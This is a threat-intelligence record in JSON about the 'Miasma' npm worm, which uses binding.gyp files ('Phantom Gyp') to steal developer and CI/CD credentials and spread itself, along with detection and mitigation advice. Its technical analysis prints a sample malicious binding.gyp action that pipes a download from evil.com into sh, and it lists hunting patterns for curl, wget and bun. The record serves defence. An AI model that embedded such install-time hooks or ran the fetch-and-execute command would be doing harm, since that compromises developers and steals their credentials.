@@ -1,0 +1,263 @@
+{
+  "id": "b7cb9d48-089e-4789-9eaa-47c89297fa80",
+  "slug": "miasma-worm-evolves-with-phantom-gyp-technique-npm-supply-chain-attack",
+  "headline": "\"Miasma\" Worm Spreads Through npm Using Novel \"Phantom Gyp\" Evasion Technique",
+  "title": "Self-Propagating \"Miasma\" Worm Spreads via npm Using \"Phantom Gyp\" to Steal Credentials",
+  "summary": "A sophisticated, self-propagating worm named 'Miasma' is actively spreading through the npm open-source registry, using a novel evasion technique dubbed 'Phantom Gyp.' The attack bypasses typical security checks by abusing 'binding.gyp' files to execute malicious code during the 'npm install' process, rather than using more commonly monitored install scripts. The worm is a credential harvester that targets a wide range of secrets from developer and CI/CD environments, including npm, GitHub, AWS, and GCP, and then uses those credentials to propagate itself further.",
+  "full_report": "## Executive Summary\nA highly sophisticated, self-replicating worm known as **Miasma** is actively compromising the **[npm](https://www.npmjs.com/)** open-source ecosystem through a novel supply chain attack. Security researchers from multiple firms, including StepSecurity, Snyk, and **[Microsoft](https://www.microsoft.com/security)**, have detailed the campaign, which uses an evasive technique they've named \"Phantom Gyp.\" Instead of relying on `preinstall` or `postinstall` scripts in `package.json`, the malware executes code via `binding.gyp` files during the `npm install` process. This allows it to bypass many static analysis security tools. The Miasma worm is a potent credential stealer, harvesting secrets from developer environments and CI/CD pipelines, and then using those stolen credentials to publish more infected packages, creating a rapidly spreading infection.\n\n---\n\n## Threat Overview\nThe Miasma worm represents a significant evolution in **[supply chain attacks](https://en.wikipedia.org/wiki/Software_supply_chain_attack)**. Its self-propagating nature allows it to spread exponentially without direct continuous operator involvement. The attack, attributed in part to a cluster known as **TeamPCP**, leverages the Mini Shai-Hulud worm code released publicly in May 2026.\n\nThe attack chain is as follows:\n1.  **Initial Compromise**: A developer installs a compromised npm package.\n2.  **Evasive Execution**: During the `npm install` command, the `node-gyp` tool processes a malicious `binding.gyp` file within the package. This triggers the execution of a malicious script, a technique that evades security scanners focused on `package.json` scripts.\n3.  **Payload Staging**: The initial script downloads the Bun JavaScript runtime to further evade detection tools focused on Node.js behavior, and then executes the main payload.\n4.  **Credential Harvesting**: The Miasma payload scrapes the environment for a wide array of secrets, including `npm` tokens, `GitHub` credentials, `AWS`, `GCP`, and `Azure` keys, `HashiCorp Vault` tokens, `Kubernetes` configs, local SSH keys, and browser data.\n5.  **Propagation**: The worm uses stolen `npm` tokens to publish new malicious versions of other packages owned by the compromised developer. It also uses stolen `GitHub` credentials to inject malicious steps into the victim's CI/CD workflows (e.g., GitHub Actions) for persistence and further spread.\n\n## Technical Analysis\nThe core innovation of this attack is the \"Phantom Gyp\" technique, an abuse of a legitimate build process. The `binding.gyp` file is a JSON-like file used by `node-gyp` to configure how native C++ addons are compiled. Attackers have embedded a command in the `targets` section of this file that is executed by the system's shell during the installation process, a form of **[T1189 - Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)**.\n\nAn example of a malicious `binding.gyp` entry:\n```json\n{\n  \"targets\": [\n    {\n      \"target_name\": \"malicious_build\",\n      \"sources\": [],\n      \"actions\": [\n        {\n          \"action_name\": \"run_payload\",\n          \"inputs\": [],\n          \"outputs\": [],\n          \"action\": [\"sh\", \"-c\", \"curl -sL https://evil.com/payload.sh | sh\"]\n        }\n      ]\n    }\n  ]\n}\n```\nThe worm's ability to propagate via CI/CD pipelines is particularly dangerous. By modifying `github/workflows` files, it can compromise the software build process itself, injecting the worm into legitimate software artifacts and potentially spreading it to downstream users and customers. This is a classic example of **[T1199 - Trusted Relationship](https://attack.mitre.org/techniques/T1199/)** abuse.\n\n## Impact Assessment\nThe Miasma worm poses a critical threat to the software development ecosystem:\n-   **Widespread Credential Theft**: The worm can lead to the mass compromise of developer and cloud infrastructure credentials, providing attackers with broad access to sensitive systems.\n-   **Rapid, Uncontrolled Spread**: Its worm-like nature means a single compromised developer can trigger a chain reaction, infecting dozens of other packages and developers.\n-   **CI/CD Pipeline Poisoning**: Compromising the build process can lead to trojanized software being shipped to customers, turning a developer-focused problem into a widespread customer-facing incident.\n-   **Erosion of Trust in Open Source**: Attacks like this undermine trust in the open-source package registries that modern software development relies on.\n\nThe scale is significant; one compromised package, `@vapi-ai/server-sdk`, has over 400,000 monthly downloads, illustrating the potential reach of the infection.\n\n## IOCs — Directly from Articles\nNo specific file hashes, IP addresses, or domains were provided in the source articles.\n\n## Cyber Observables — Hunting Hints\nSecurity teams may want to hunt for the following patterns to detect related activity:\n\n| Type | Value | Description |\n|---|---|---|\n| File Name | `binding.gyp` | The presence of a `binding.gyp` file in a package that has no legitimate reason to compile native addons is highly suspicious. |\n| Process Name | `node-gyp` | Monitor for `node-gyp` processes that spawn unexpected child processes, such as `curl`, `wget`, or shell scripts. |\n| Process Name | `bun` | The presence of the Bun runtime (`bun`) in a CI/CD environment or on a developer machine where it is not explicitly used is a strong indicator of this campaign. |\n| File Path | `.github/workflows/` | Monitor for unexpected modifications to GitHub Actions workflow files, especially those that add new `run` steps with obfuscated commands. |\n\n## Detection & Response\n1.  **Scan for Malicious `binding.gyp`**: Use static analysis tools or custom scripts to scan npm dependencies for `binding.gyp` files containing suspicious `actions` or shell commands.\n2.  **Monitor Build Processes**: Instrument CI/CD pipelines to monitor for anomalous behavior during `npm install`. Look for unexpected network connections, file system access outside the project directory, or the execution of unexpected processes (`bun`). This aligns with D3FEND's **[Process Analysis (D3-PA)](https://d3fend.mitre.org/technique/d3f:ProcessAnalysis)**.\n3.  **Dependency Tree Analysis**: Use tools like `npm ls` to check for the presence of known compromised packages in your projects' dependency trees.\n4.  **Credential Scanning**: Regularly scan code repositories and CI/CD logs for accidentally exposed credentials.\n\n## Mitigation\n1.  **Use `--ignore-scripts`**: When running `npm install` in CI/CD pipelines or for simple dependency checks, use the `--ignore-scripts` flag. This will prevent `preinstall`, `postinstall`, and `node-gyp` build scripts from running. Note that this will break packages that legitimately need to compile addons.\n2.  **Vet Dependencies**: Before adding a new dependency, scrutinize its health. Check for recent updates, the number of maintainers, and the presence of suspicious files like `binding.gyp`.\n3.  **Lock Dependencies**: Use a lockfile (`package-lock.json`) and do not automatically update to the latest versions of packages without review. This prevents a newly compromised version from being pulled into your build.\n4.  **Principle of Least Privilege in CI/CD**: Ensure that CI/CD jobs have only the minimum necessary permissions. Use short-lived, scoped access tokens instead of persistent secrets wherever possible. This is a form of D3FEND's **[User Account Permissions (D3-UAP)](https://d3fend.mitre.org/technique/d3f:UserAccountPermissions)**.",
+  "twitter_post": "🚨 A self-propagating worm called 'Miasma' is spreading through the npm registry using a new 'Phantom Gyp' technique to bypass security checks and steal dev credentials. #SupplyChainAttack #npm #CyberSecurity #Miasma",
+  "meta_description": "A sophisticated, self-propagating worm named \"Miasma\" is spreading through the npm registry using a novel technique called \"Phantom Gyp\" to steal credentials.",
+  "category": [
+    "Supply Chain Attack",
+    "Malware",
+    "Threat Actor"
+  ],
+  "severity": "critical",
+  "entities": [
+    {
+      "name": "Miasma",
+      "type": "malware"
+    },
+    {
+      "name": "TeamPCP",
+      "type": "threat_actor"
+    },
+    {
+      "name": "Mini Shai-Hulud",
+      "type": "malware"
+    },
+    {
+      "name": "npm",
+      "type": "technology"
+    },
+    {
+      "name": "node-gyp",
+      "type": "technology"
+    },
+    {
+      "name": "GitHub",
+      "type": "company"
+    },
+    {
+      "name": "AWS",
+      "type": "vendor"
+    },
+    {
+      "name": "GCP",
+      "type": "vendor"
+    },
+    {
+      "name": "Azure",
+      "type": "vendor"
+    },
+    {
+      "name": "HashiCorp",
+      "type": "vendor"
+    },
+    {
+      "name": "Kubernetes",
+      "type": "technology"
+    },
+    {
+      "name": "Red Hat",
+      "type": "vendor"
+    },
+    {
+      "name": "Microsoft",
+      "type": "vendor",
+      "url": "https://www.microsoft.com/security"
+    },
+    {
+      "name": "StepSecurity",
+      "type": "security_organization"
+    },
+    {
+      "name": "Snyk",
+      "type": "vendor"
+    }
+  ],
+  "cves": [],
+  "sources": [
+    {
+      "url": "https://www.stepsecurity.io/blog/binding-gyp-npm-supply-chain-attack-spreads-like-worm",
+      "title": "Miasma npm Supply Chain Attack: Self-Spreading Worm via Phantom Gyp - StepSecurity",
+      "date": "2026-06-03",
+      "friendly_name": "StepSecurity"
+    },
+    {
+      "url": "https://www.chainguard.dev/unchained/chainguard-artifacts-safe-from-miasma-phantom-gyp-npm-attack",
+      "title": "Miasma Phantom Gyp npm attack: 57 packages, 286 malicious versions hijack CI/CD pipelines via binding.gyp",
+      "date": "2026-06-05",
+      "friendly_name": "Chainguard"
+    },
+    {
+      "url": "https://snyk.io/blog/node-gyp-supply-chain-compromise-self-propagating-npm-worm-binding-gyp/",
+      "title": "Node-gyp Supply Chain Compromise - June 2026",
+      "date": "2026-06-04",
+      "friendly_name": "Snyk"
+    },
+    {
+      "url": "https://www.upwind.io/feed/miasma-npm-supply-chain-worm-redhat-credential-harvest",
+      "title": "Miasma: A Worming npm Supply Chain Attack on Red Hat Cloud Services - Upwind Security",
+      "date": "2026-06-04",
+      "friendly_name": "Upwind Security"
+    },
+    {
+      "url": "https://socprime.com/active-threats/miasma-supply-chain-attack-spreads-through-the-phantom-gyp-worm/",
+      "title": "Miasma Supply Chain Attack Spreads Through the Phantom Gyp Worm - SOC Prime",
+      "date": "2026-06-05",
+      "friendly_name": "SOC Prime"
+    },
+    {
+      "url": "https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/",
+      "title": "Preinstall to persistence: Inside the Red Hat npm Miasma credential-stealing campaign | Microsoft Security Blog",
+      "date": "2026-06-02",
+      "friendly_name": "Microsoft Security"
+    }
+  ],
+  "events": [
+    {
+      "datetime": "2026-06-03T00:00:00Z",
+      "summary": "A rapid campaign was observed where attackers published over 286 malicious versions across 57 npm packages in under two hours."
+    }
+  ],
+  "mitre_techniques": [
+    {
+      "id": "T1199",
+      "name": "Trusted Relationship",
+      "tactic": "Initial Access"
+    },
+    {
+      "id": "T1189",
+      "name": "Drive-by Compromise",
+      "tactic": "Initial Access"
+    },
+    {
+      "id": "T1552",
+      "name": "Unsecured Credentials",
+      "tactic": "Credential Access"
+    },
+    {
+      "id": "T1059.007",
+      "name": "JavaScript",
+      "tactic": "Execution"
+    }
+  ],
+  "mitre_mitigations": [
+    {
+      "id": "M1038",
+      "name": "Execution Prevention",
+      "d3fend_techniques": [
+        {
+          "id": "D3-EAL",
+          "name": "Executable Allowlisting",
+          "url": "https://d3fend.mitre.org/technique/d3f:ExecutableAllowlisting"
+        }
+      ],
+      "description": "Preventing the execution of arbitrary scripts during package installation, such as with the '--ignore-scripts' flag, is a key mitigation.",
+      "domain": "enterprise"
+    },
+    {
+      "id": "M1048",
+      "name": "Application Isolation and Sandboxing",
+      "d3fend_techniques": [
+        {
+          "id": "D3-DA",
+          "name": "Dynamic Analysis",
+          "url": "https://d3fend.mitre.org/technique/d3f:DynamicAnalysis"
+        }
+      ],
+      "description": "Running build processes in isolated, ephemeral containers can limit the worm's ability to access persistent credentials or propagate.",
+      "domain": "enterprise"
+    },
+    {
+      "id": "M1026",
+      "name": "Privileged Account Management",
+      "d3fend_techniques": [
+        {
+          "id": "D3-UAP",
+          "name": "User Account Permissions",
+          "url": "https://d3fend.mitre.org/technique/d3f:UserAccountPermissions"
+        }
+      ],
+      "description": "Using short-lived, narrowly scoped credentials in CI/CD pipelines minimizes the impact if they are stolen.",
+      "domain": "enterprise"
+    }
+  ],
+  "d3fend_countermeasures": [],
+  "iocs": [],
+  "cyber_observables": [
+    {
+      "type": "file_name",
+      "value": "binding.gyp",
+      "description": "The presence of this file in a dependency that does not compile native addons is a primary indicator of the 'Phantom Gyp' technique.",
+      "context": "Static analysis of npm packages in source code repositories.",
+      "confidence": "high"
+    },
+    {
+      "type": "process_name",
+      "value": "bun",
+      "description": "The Miasma worm uses the Bun runtime to execute its payload, likely to evade detection focused on Node.js. Its presence in an unexpected context is suspicious.",
+      "context": "Process monitoring in CI/CD environments or on developer workstations.",
+      "confidence": "high"
+    },
+    {
+      "type": "command_line_pattern",
+      "value": "npm install --ignore-scripts",
+      "description": "Using this command prevents the execution of malicious scripts embedded in packages, serving as a key mitigation.",
+      "context": "CI/CD pipeline configuration and developer best practices.",
+      "confidence": "high"
+    },
+    {
+      "type": "file_path",
+      "value": ".github/workflows/",
+      "description": "The worm modifies GitHub Actions workflow files to inject itself into the build process for propagation. Unauthorized changes to this directory are a red flag.",
+      "context": "Source code repository monitoring and pull request reviews.",
+      "confidence": "high"
+    }
+  ],
+  "tags": [
+    "Miasma",
+    "Phantom Gyp",
+    "npm",
+    "Supply Chain Attack",
+    "Worm",
+    "Credential Theft",
+    "CI/CD"
+  ],
+  "extract_datetime": "2026-07-02T15:00:00.000Z",
+  "article_type": "Analysis",
+  "impact_scope": {
+    "geographic_scope": "global",
+    "industries_affected": [
+      "Technology"
+    ],
+    "other_affected": [
+      "Open-source software developers",
+      "Users of npm packages"
+    ]
+  },
+  "pub_date": "2026-07-02",
+  "reading_time_minutes": 6,
+  "createdAt": "2026-07-02T15:00:00.000Z",
+  "updatedAt": "2026-07-22T12:00:00Z",
+  "updates": [
+    {
+      "update_id": "update-1",
+      "update_date": "2026-07-22T12:00:00Z",
+      "datetime": "2026-07-22T12:00:00Z",
+      "title": "Update 1",
+      "summary": "Miasma worm campaign expands to PyPI with Hades variant, using .pth files for persistence. Over 100 packages compromised, increasing overall impact.",
+      "sources": [
+        {
+          "title": "The Streak Continues: Four More Supply Chain Attacks Hit npm and PyPI",
+          "url": "https://securityboulevard.com/2026/07/the-streak-continues-four-more-supply-chain-attacks-hit-npm-and-pypi/"
+        },
+        {
+          "title": "Ransomware Attacks Rise 3% in Q2 as Supply Chain Compromises Escalate, NCC Group Warns",
+          "url": "https://www.itsecurityguru.org/2026/07/22/ransomware-attacks-rise-3-in-q2-as-supply-chain-compromises-escalate-ncc-group-warns/"
+        }
+      ]
+    }
+  ]
+}
